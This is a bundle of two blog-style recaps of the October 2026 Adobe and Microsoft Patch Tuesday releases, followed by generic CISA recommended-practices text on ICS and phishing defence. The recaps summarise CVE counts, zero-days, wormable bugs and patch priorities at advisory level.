summary: Another month of patches equals another new record for Microsoft patches. It’s a good thing I survive Pwn2Own Ireland , because between these and the Adobe patches, there’s much to discuss. I’m also looking at different ways I can represent the bugs at this level of volume, so let me know if you have ideas. (Seriously – I’m out of ideas). If you’d rather watch the full video recap covering the entire release, you can check it out here: Adobe Patches for October 2026 For the first part of the October release, Adobe released 11 bulletins addressing 174 unique CVEs in Adobe Dimension, Commerce, Substance 3D Sampler, ColdFusion, Photoshop, FrameMaker, Experience Manager, Substance 3D Stager, Content Credentials SDK, Bridge, and Substance 3D Designer. Here’s this month’s overview table: Adobe Patches for October 2026 Adobe Patches for October 2026 Bulletin ID Product CVE Count Highest Severity Highest CVSS Exploited Deployment Priority APSB26-152 Adobe Experience Manager 33 Critical 10.0 No 2 APSB26-144 Adobe ColdFusion 32 Critical 10.0 No 2 APSB26-153 Adobe Commerce 11 Critical 10.0 No 2 APSB26-163 Content Credentials SDK 30 High 8.6 No 3 APSB26-171 Adobe Dimension 7 High 8.6 No 3 APSB26-158 Adobe Photoshop 18 High 8.2 No 3 APSB26-170 Adobe Substance 3D Stager 16 High 7.8 No 3 APSB26-172 Adobe FrameMaker 10 High 7.8 No 3 APSB26-169 Adobe Substance 3D Designer 9 High 7.8 No 3 APSB26-159 Adobe Substance 3D Sampler 4 High 7.8 No 3 APSB26-167 Adobe Bridge 4 High 7.8 No 3 TOTAL 11 bulletins 174 The one I’d treat as most urgent is the patch for ColdFusion despite the Priority 2 rating. In addition to the CVSS 10 bug, the 10 Critical CVEs include unrestricted file upload (CWE-434), code injection (CWE-94), SSRF, and incorrect authorization — a classic pre-auth RCE profile on an internet-facing server product. Impacts run from arbitrary code execution and privilege escalation to arbitrary file read/write. Up next is the bulletin covering Commerce . It may have the smallest count, but it’s a high-value target, and it follows last month’s actively exploited Commerce zero-day (CVE-2026-75650). The Critical bugs include template-engine injection and incorrect authorization, yielding code execution, privilege escalation, and arbitrary file write. Adobe’s table also flags whether authentication is required per CVE, which is useful for triage here. Finally, the other Priority 2 update covers Experience Manager and is the broadest of the three. Beyond the usual XSS volume (stored, reflected, and DOM-based), it includes genuinely serious server-side bugs: OS command injection, SQL injection, XXE, XML injection, and path traversal, leading to code execution, privilege escalation, and security feature bypass. Worth noting the Vulnerability Details table has 34 rows, but CVE-2026-106631 is listed twice, so it’s 33 distinct CVEs. Aside from the bugs mentioned, all other Adobe patches are Deployment Priority 3. None of the other Adobe bugs receiving patches this month are listed as publicly known or under active attack at the time of release. Microsoft Patches for October 2026 Before we get into this month’s Microsoft release, let’s talk about what they changed. Microsoft is introducing “risk cohorts”. According to Microsoft, “They are an exploratory way to help customers organize their own analysis. They are not official Microsoft vulnerability categories, do not change Microsoft update guidance, and do not replace the assessment of individual CVEs.” Back in my day, we called these security bulletins. One component could have multiple CVEs in a single bulletin. Microsoft is reintroducing this concept at the group level. I applaud this change as it mirrors my analysis from last month (and this month). Time will tell if enterprises can capitalize on these “cohorts”, but any move made to make the monthly release more manageable is a welcome one. You can read the full details on Microsoft’s site here . Now on to our regularly scheduled analysis. Well, it’s a new record release from Microsoft, again. This is also the first four-digit volume we have ever seen and includes six-digit CVEs. As always, counting this load is tricky, but I see 1,415 new CVEs from Microsoft. That puts this month at a greater volume than any previous YEAR from Microsoft. I’m starting to think I don’t like this new normal. As for the products affected by this release, we have Windows and Windows components, Office and Office Components, Developer Tools and .NET, SharePoint, Linux kernel, Skype for Business and Microsoft Lync, SQL Server and Dynamics, Azure and cloud services, and Exchange server. Still, if there’s solace to be had, it’s in the fact that only one of these bugs is under active attack. If you go back to the “Hot 0-day Summer” of 2023, there were 17 Microsoft 0-days between January and October as opposed to 15 this year during the same period. The total number of Microsoft CVEs in 2023? Just 914. So, AI is certainly helping in bug discovery (and likely in bug patching), but we haven’t seen the same increase in the exploitation of 0-days – yet. As witnessed at the last Pwn2Own, AI-assisted exploitation is most certainly a thing. It just hasn’t hit the mainstream yet, even though other incidents are on the rise. Hundreds of CVEs in a single release used to be the exception; now it’s the baseline. Is AI to blame? Partly. It’s accelerating bug-hunting on both sides of the fence, so vendors are finding (and fixing) more flaws, and researchers are finding them faster too. But AI isn’t creating these bugs out of thin air. It’s just shortening the time between a vulnerability existing and someone noticing it. What matters is that discovery is scaling faster than exploitation, so teams that triage by sheer CVE count instead of exploitability are burning cycles on the wrong bugs. Patch what’s proven, prioritized, and public, and treat everything else as this month’s new normal. Two bugs in this release are listed as publicly known: CVE-2026-108398, a .NET Framework security feature bypass that could let an attacker evade Windows Defender Application Control (WDAC) enforcement, and CVE-2026-92707, a denial-of-service bug in MessagePack-CSharp that was released by a third party and is now included in Microsoft’s release. Neither is listed as under active attack. As always, we’ll start with the bug under active attack and move on from there. - CVE-2026-96951 - Windows Shell Security Feature Bypass Vulnerability This is the lone bug listed as under active attack, and it’s certainly a type of bug we’ve seen before. Going back to 2024 , attackers have used multiple methods to avoid Mark of the Web (MotW) protections. This time, it’s Shell instead of SmartScreen, but the result is the same. As with any bug under active attack, test and deploy this patch quickly - CVE-2026-102866 – Microsoft Office SharePoint Elevation of Privilege Vulnerability There are lots of SharePoint bugs this month, but this one stands out. It’s the only Critical-rated SharePoint CVE (CVSS 8.1), and the only one an unauthenticated attacker can exploit. It’s an improper cryptographic signature verification bug. An attacker who obtains a valid proof token for a targeted user could modify it, submit it to the server, and authenticate as that user. The only caveat is that the attacker has to obtain that token first, but there are multiple methods this could be achieved. - CVE-2026-65674 – Microsoft SQL Server Remote Code Execution Vulnerability Like SharePoint, there’s lots to choose from in the SQL component. This one is the highest-scoring CVSS at 8.8 and has the best exploitability rating of any SQL Server bug this month. It’s a deserialization of untrusted data. An authenticated attacker connects to an affected SQL Server and sends a specially crafted request to run code on the server. No user interaction is needed. Definitely check this on any SQL Server directly connected to the internet. - CVE-2026-70571 - Microsoft Exchange Server Remote Code Execution Vulnerability Technically speaking, this is a wormable bug in Exchange Server. However, I wouldn’t count on that happening. Microsoft states, “Exploitation requires an attacker to have a deep understanding of the target environment and is not guaranteed to succeed.” While the wording is obtuse, it generally means the likelihood of stars aligning to exploit the Exchange Server through this bug is minuscule. Speaking of Wormable… I normally call out every bug I think is wormable, but there are just too many this month. Let me sum up. A total of 59 of the October CVEs fit my definition of wormable. Specifically, 57 contain both “An unauthenticated attacker could exploit this vulnerability by sending a specially crafted packet to an affected service over the network” and “No authentication or user interaction is required.” Two more, CVE-2026-70147 and CVE-2026-88178 , use variant wording but also require no authentication or user interaction. These bugs are as follows: • DHCP Server (6): CVE-2026-96934 , 88117 , 88119 , 88120 , 96320 , 69830 • Network Policy Server (4): CVE-2026-100222 , 85806 , 85371 , 85799 • Windows Error Reporting (4): CVE-2026-83519 , 83693 , 83748 , 97815 • Remote Desktop Gateway (3): CVE-2026-70187 , 100218 , 84012 • Text Shaping (3): CVE-2026-102210 , 83770 , 97814 • Two each (14): QUIC ( CVE-2026-100219 , 105016 ), Schannel ( CVE-2026-105008 , 105005 ), DNS Server ( CVE-2026-83869 , 70127 ), Media Foundation ( CVE-2026-83517 , 85814 ), Microsoft XML ( CVE-2026-83935 , 83914 ), RRAS ( CVE-2026-85792 , 85809 ) and PostScript Printer Driver ( CVE-2026-70147 , 70153 ) • One each (25): Windows Search ( CVE-2026-105010 ), TCP/IP ( CVE-2026-69913 ), IIS ( CVE-2026-70024 ), libarchive ( CVE-2026-70062 ), Rich Text Edit Control ( CVE-2026-70096 ), System Information Console ( CVE-2026-70157 ), .NET ( CVE-2026-70197 ), Active Directory Domain Services ( CVE-2026-70229 ), PowerShell ( CVE-2026-83578 ), CCFFilter Driver ( CVE-2026-83780 ), Shell ( CVE-2026-83782 ), Paint ( CVE-2026-83844 ), Network Load Balancing ( CVE-2026-83862 ), RPC Runtime ( CVE-2026-83910 ), PPP EAP-TLS ( CVE-2026-84015 ), Volume Manager Extension Driver ( CVE-2026-85928 ), Failover Cluster ( CVE-2026-88102 ), Failover Cluster Virtual Driver ( CVE-2026-96864 ), LSASS ( CVE-2026-96219 ), BitLocker ( CVE-2026-96909 ), OLE ( CVE-2026-96924 ), PowerPoint ( CVE-2026-88178 ), Message Queuing ( CVE-2026-108460 ), OpenSSH for Windows ( CVE-2026-97816 ) and Partition Management Driver ( CVE-2026-97805 ) I may be wrong about some of these – there are a few where the description is somewhat…er…ambiguous, but regardless, this number of wormable bugs in 2026 should cause some level of concern. Not panic. There’s no need for that, but it is disconcerting to see this many juicy targets sitting out there. Please do your best to test and deploy these fixes in a timely manner. everything else in this release but assume there are details I miss or that will be revised after the release. Local Privilege Escalations: To say these bugs are prevalent is an understatement. However, of the 677 EoP bugs in the data, 606 (90%) lead to SYSTEM, administrator or root privileges. There are also a few integrity-level or sandbox escapes. There are 10 bugs where the attacker moves from low to medium integrity, and six where they escape a Low Integrity Level or AppContainer sandbox. There are seven bugs where the advisory says only “ELEVATED privileges,” or describes a cloud identity or data-access issue. There are nearly two dozen others where the attacker runs as another user or service account, creates or deletes files in a privileged context, or reaches Local Service. This includes CVE-2026-70190, which lets the attacker create, modify or delete files as SYSTEM but doesn’t give SYSTEM privileges. Frustratingly, there are 23 that have no “what privileges” FAQ at all, and some of these may be cloud fixes with no action needed. If I can be bothered to read them all, they should be bothered to write them all. Office-Related Bugs: I’ve already mentioned a couple of these above, but that still leaves a lot to cover. Counting Skype for Business and Bookings, there are 139 Office-related CVEs (including those mentioned above): 100 RCE, 29 info disclosure, nine EoP and one security feature bypass. Thirty-five are Critical and 104 are Important. I would focus on Outlook, with five Critical RCEs at CVSS 9.8. All five say simply viewing the email in the Reading Pane triggers the bug, with no click and no authentication. That makes them the closest thing to wormable in Office. Then there are the 69 Excel bugs; 51 RCEs and 18 info leaks. Nineteen of these RCEs are Critical at 8.8 (for example CVE-2026-100209). Most of these are the open-and-own variety. Four Excel bugs do list the Preview Pane: CVE-2026-70254 and 88145 (RCE, 8.8), and 88154 and 88175 (info leaks). Word adds 22 more. Most of the RCEs and info leaks name the Preview Pane as a vector. The rest are an EoP and a security feature bypass. There are 12 Access RCEs and three Critical Visio RCEs that are open-and-own. Access also has one info. PowerPoint rounds things out with three Critical RCEs, all of which name the Preview Pane. The other four are info leaks. DNS and DNS Server Bugs: There are 58 CVEs in Windows DNS and DNS Server: 52 tagged DNS Server (role) and six tagged Windows DNS. All 58 are Important, including CVE-2026-96113, an RCE scored at CVSS 9.8. There are still a few where the advisories describe the impact as unauthorized attackers executing code over the network, but without the exact wormable wording. Four of these are untrusted pointer dereferences and one is type confusion. The majority of these bugs (31) are info disclosures. Five are tampering bugs and one is a security feature bypass, but all of these require authentication. Windows Kernel and the Win32k Subsystem: Alright – don’t @me. I know the difference between kernel and Win32k components, but they’re similar enough that I group them together. There are 94 CVEs in the Windows Kernel and Win32K components: Windows Kernel (46), Win32 Kernel Subsystem (36), Win32K (8), Win32K GRFX (3) and Win32K ICOMP (1). By type, 71 are elevation of privilege, 20 are info disclosure, 2 are DoS and 1 is a security feature bypass. Most of these just lead to SYSTEM access as expected. Of the info disclosure bugs, these primarily leak random portions of memory. The only real outlier here is CVE-2026-70111, whose advisory says the attacker elevates privileges “over a network.” That’s unusual for a kernel EoP. Windows DHCP Client and Server: There are 18 CVEs in Windows DHCP: 16 in DHCP Server and 2 in DHCP Client. We’ve already discussed the wormable ones, so I won’t rehash them here. Of the remaining 12 DHCP bugs, two are Critical. CVE-2026-88171 is an unauthenticated double free in DHCP Server that just misses being wormable, and CVE-2026-70250 is a DHCP Client use-after-free that requires an adjacent network. The rest are a mix of authenticated RCEs, two unauthenticated DoS bugs, two EoPs and two security feature bypasses, none rated above “Exploitation Less Likely” by Microsoft. SharePoint Server: Besides the Critical bug already mentioned, SharePoint has 34 other CVEs this month: 13 EoP, seven spoofing, seven RCE, six info disclosure and one tampering bug. All of the rest are Important. The seven RCEs all lean on authentication, but the bar is low. CVE-2026-85900 needs only Site Member permissions, and CVE-2026-88155, 88163 and 88166 need Manage List. CVE-2026-105013 and 70267 don’t say what level an attacker needs, so assume these default permissions only. The bug classes read more like a web-app pentest report than memory corruption: seven of the EoPs are authorization and access-control failures, three more are SSRF, and the spoofing bugs are mostly stored script. The one other unauthenticated bug is CVE-2026-97783, a spoofing flaw at CVSS 8.1. Given SharePoint’s recent history of “Exploitation Less Likely” turning into “in the wild,” don’t skip the RCEs just because they need credentials. SQL Server and Client: Beyond the RCE already mentioned, SQL Server and its client tools have 23 other CVEs this month: nine RCE, seven EoP, four info disclosure, and three DoS. All are Important. The pattern here is authenticated memory corruption: heap and stack overflows, use-after-frees, and out-of-bounds reads. The template is simple: log in, submit a crafted request, corrupt memory, run code on the server. That’s why the CVSS 8.8 bugs here are less scary than they score; an attacker already needs database credentials, but it’s also textbook post-compromise lateral movement. The odd one out is CVE-2026-103572, which isn’t a database bug at all. It’s in SQL Server Management Studio, where a prompt injection through Copilot can turn into code execution. As AI features creep (sneak?) into admin tools, I expect to see more of this. Windows Installer: Windows Installer is the largest component I haven’t mentioned yet, with 38 CVEs: 35 EoPs and three info disclosure bugs. Every one of these bugs are local, every one is Important, and none top CVSS 7.8. Thirty-four of the 35 EoPs end in SYSTEM. The bug classes are the usual memory-safety suspects, with use-after-frees (20) leading, followed by heap overflows (6) and stack overflows (3). It’s the same story we see every month with Installer: an attacker who already has a foothold abuses the repair and rollback paths to get to SYSTEM. None of these will get a headline by themselves, but this is exactly what ransomware crews chain after phishing a user, so don’t skip them. Windows NTFS: NTFS has 26 CVEs this month: 16 EoP, six info disclosure and four RCE. All are Important, none is above CVSS 7.8, and 21 of the 26 are local. The EoPs all lead to SYSTEM, and five of them (CVE-2026-96217, 96916, 96918, 96928 and 96931) are sandbox escapes caused by reparse points created by sandboxed processes. That means a compromised browser or app sandbox could use them to break out. The four RCEs all require an authorized local attacker, so they’re closer to EoPs with extra steps than real remote bugs. Everything else is memory corruption: out-of-bounds reads lead, then use-after-frees and heap overflows. Remote Desktop and Remote Access: Remote Desktop has 30 CVEs across its components: 22 RCE, four info disclosure, two EoP, one DoS and one security feature bypass. Only one is Critical (CVE-2026-70187 in Remote Desktop Gateway, already covered with the wormable bugs). The Remote Desktop Client accounts for 19, 18 of them RCEs, and nearly all are use-after-frees. These are the reverse of the usual direction: the attacker needs a user to connect to a malicious server, so they’re social-engineering bugs. Gateway adds a DoS (CVE-2026-70033) and an info leak (CVE-2026-84007) beyond the three wormable RCEs. Windows Remote Desktop Protocol has two EoPs to SYSTEM, CVE-2026-83861 and -96322. RRAS adds 13 more, including four RCEs, two of which are the 9.8 wormable bugs. Hyper-V Server: Hyper-V has 18 CVEs: seven EoP, four RCE, two each of DoS, info disclosure and security feature bypass, and one spoofing bug. Two are Critical RCEs at CVSS 8.8, CVE-2026-102214 and 105733. The first is the classic guest-to-host scenario, in which an authenticated user on a guest runs a crafted app to execute code on the host. That’s the scenario that matters for anyone running multi-tenant hosts or shared virtualization. CVE-2026-83716 and 83931 are two more guest-triggered RCEs, scored 8.8 and 7.8. The newest Critical addition, CVE-2026-108399, is an EoP at 7.2. Of the other bugs, CVE-2026-85369 is an EoP at 8.2, and CVE-2026-87705 is an unauthenticated security feature bypass over an adjacent network (7.4). Everything is rated “Exploitation Less Likely” except one at “Unlikely,” but test and deploy these before the Hyper-V hosts that carry the most sensitive workloads. A few additional bugs deserve at least a brief mention. The Windows Message Queuing service receives a Critical-rated, 9.8 use-after-free (CVE-2026-100202) that could allow remote code execution via a crafted message, though MSMQ isn’t enabled by default. Five VBS Enclave bugs are also rated Critical and could allow a local attacker to reach SYSTEM. Several 9.8-rated RCEs in Imaging Component, libarchive, Media Player and iSCSI require an in-network attacker. Newer additions to the release include Critical RCEs in Windows PDF (CVE-2026-108457), the PostScript Printer Driver (CVE-2026-108467) and HEVC Video Extensions (CVE-2026-108400), along with a Critical AD FS spoofing bug (CVE-2026-108131). The Exchange XSS (CVE-2026-70279) and the VS Code project-open RCE (CVE-2026-102238) round out the higher-scoring items. The remaining ~850 fixes are mostly lower-profile: local EoPs, information disclosures, and denial-of-service bugs. They are spread across Windows Search, .NET and ASP.NET Core, Windows Error Reporting, Broadcast DVR, UDFS, the Overlay Filter driver, AD FS, WebDAV and DWM. Seven cloud fixes (Partner Center, Azure App Service, Dataverse, Azure SRE Agent, API Center, Bookings and Event Grid) are rated Critical but need no customer action. No new advisories are being released this month. Looking Ahead The next Patch Tuesday will be on November 10. Regardless of how big (or how small!) the release may be, I’ll be back to do my best to discern what you need to know. Until then, stay safe, happy patching, and may all your reboots be smooth and clean!

summary: Microsoft is publishing 1,413 own-product vulnerabilities on October 2026 Patch Tuesday , including 1,102 vulnerabilities in Windows. Anyone who enjoyed last month’s record-setting Patch Tuesday will love the October 2026 edition, because it’s much bigger still. As Rapid7 has noted over the course of 2026, there is every reason to suppose that vulnerability volumes will continue to rise. Microsoft is aware of exploitation in the wild for just one of the vulnerabilities published today, as well as public disclosure for two others. Windows Shell: zero-day security feature bypass The Windows Shell is Microsoft’s term for the GUI interaction logic for the entire OS provided by explorer.exe and associated libraries and APIs, and for the second time this year , the Windows Shell is the site of an exploited-in-the-wild zero-day vulnerability. Today’s specimen is CVE-2026-96951 . Once again, the immediate prize for an attacker is a Mark of the Web (MOTW) bypass. What this means is that Windows won’t provide the user with a dialog explaining that Windows protected their PC, because in this case, it didn’t. Exploitation requires that a user opens a specially crafted malicious file or visits an attacker-controlled site, so the evergreen advice about being careful what you click remains valid. Fans of vintage operating systems should note that Windows Server 2012 doesn’t receive a patch, although Server 2012 R2 does. The advisory acknowledges reporters from multiple organizations, although none from within Microsoft. The vulnerability also affected Microsoft’s Outlook.com cloud services, although Outlook.com was patched in a build dated several weeks ago. .NET Framework: zero-day security feature bypass Microsoft is aware of some level of public disclosure of CVE-2026-108398 , a .NET Framework security feature bypass. Exploitation requires an attacker with an existing foothold to register a malicious .NET assembly for loading by a protected process, bypassing Windows Defender Application Control (WDAC) enforcement. Microsoft rebranded WDAC as App Control for Business several years ago, so you may know it under its new name. The Microsoft Learn page for Application Control for Windows points out that “your organization's data is one of its most valuable assets... and threat actors want it”, and this is, of course, correct. The patch presumably removes an attacker-controlled location from the list of places .NET Framework searches for registered assemblies, which are typically contained within DLLs and executables. If any further indications were needed that vulnerability volumes are increasing industry-wide, this is only the second month that Microsoft has published vulnerabilities with six-digit CVE numbers, but these extra-large CVEs will seem unremarkable from now on. Outlook: multiple no-interaction RCEs The sheer volume of vulnerabilities in recent Patch Tuesday releases can easily include several examples of potentially concerning vulnerabilities, each of which might have been more remarkable in its own right back when volumes were lower. Today, Microsoft has published five separate remote code execution vulnerabilities in Outlook where the preview pane is a vector, meaning that simply scrolling past an email in the Outlook reading pane would be sufficient to trigger exploitation. Worse still, Outlook might helpfully display the preview without any user interaction at all. All five of CVE-2026-70242 , CVE-2026-97749 , CVE-2026-97016 , CVE-2026-88156 , and CVE-2026-70291 receive fixes in the same patches. No-interaction Outlook preview pane vulnerabilities can sometimes feature prominently in state-backed actor campaigns, with CVE-2023-23397 as a prominent example in this category . Edge: security updates unclear In September 2026, Microsoft did not appear to publish any desktop browser security advisories between the start of the month and Patch Tuesday. In October, a slightly different approach has emerged: several recent entries in the Edge security updates release notes mention new versions of Edge which incorporate the latest updates from the Chromium project, but without detailing which vulnerabilities have been fixed, stating instead, “CVE's will be added as soon as available,” and directing readers to the Security Update Guide (SUG). At the time of writing, the SUG lists a total of zero vulnerabilities addressed in Edge in the first 13 days of October, and the “CVE’s added soon” message has been up for over a week. As a result, defenders have no obvious way of knowing which recent vulnerabilities Microsoft has addressed in Edge. Microsoft lifecycle update In Microsoft product lifecycle news, today sees Windows 11 24H2 Home & Pro reach end of servicing, while Windows Server 2022 moves to extended support, with free critical security updates continuing but no further feature development. Also this month, the final curtain falls for Windows Server 2012 and 2012 R2 with the expiry of the third and final year of cash-for-updates Extended Security Update (ESU) program for these aging workhorses. Microsoft lists the end of ESU Year 3 on October 14, 2026, in both cases. Microsoft has a long history of providing at least some security patches for products beyond the end of support, with Server 2008 being a case in point, but the time to move past Server 2012 is now. Office 2021 also moves into retirement on October 14; this includes the Long-Term Servicing Channel , with no ESU available in that case. Also on October 15, 2026, Exchange Server 2016 and Exchange Server 2019 finally join the “no ESU” club, after two previous six-month reprieves. Microsoft seems to really mean it this time, since any future Exchange Server CVEs released by MSRC will stop mentioning Exchange 2016 and 2019. However, Microsoft points out that a lack of warnings does not mean those unsupported versions are not vulnerable to future security issues. Summary charts

Recommended Practices CISA recommends users take defensive measures to minimize the risk of exploitation of this vulnerability. Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet. Locate control system networks and remote devices behind firewalls and isolating them from business networks. When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices. CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures. CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies. CISA encourages organizations to implement recommended cybersecurity strategies for proactive defense of ICS assets. Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies. Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents. CISA also recommends users take the following measures to protect themselves from social engineering attacks: Do not click web links or open attachments in unsolicited email messages. Refer to Recognizing and Avoiding Email Scams for more information on avoiding email scams. Refer to Avoiding Social Engineering and Phishing Attacks for more information on social engineering attacks. No known public exploitation specifically targeting this vulnerability has been reported to CISA at this time.
